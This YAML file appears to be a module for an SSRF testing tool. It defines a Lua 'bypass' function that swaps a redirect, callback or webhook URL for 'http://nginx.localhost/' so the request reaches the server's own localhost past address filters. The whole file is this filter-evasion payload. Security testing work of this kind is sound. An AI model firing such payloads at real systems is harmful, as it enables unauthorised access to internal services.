# 19. nginx_localhost_alias.yaml
meta:
  id: nginx_localhost_alias
  version: 2
  name: "Nginx Localhost Alias"
  description: "Uses nginx localhost alias"
  author: "SSRFdevil"
  created: "2026-06-19"
  updated: "2026-07-21"
  rank: 60
  confidence: 80
  severity: medium
  tags: [nginx, localhost, alias]
  references: []

match:
  schemes: [http, https]
  kinds: [Endpoint, Document]
  allowed_methods: [GET, POST]
  required_tags: [Redirect, Callback, Webhook]
  require_params: true

script:
  language: lua
  entry: bypass
  source: |
    function bypass(ctx)
      return { url = "http://nginx.localhost/" }
    end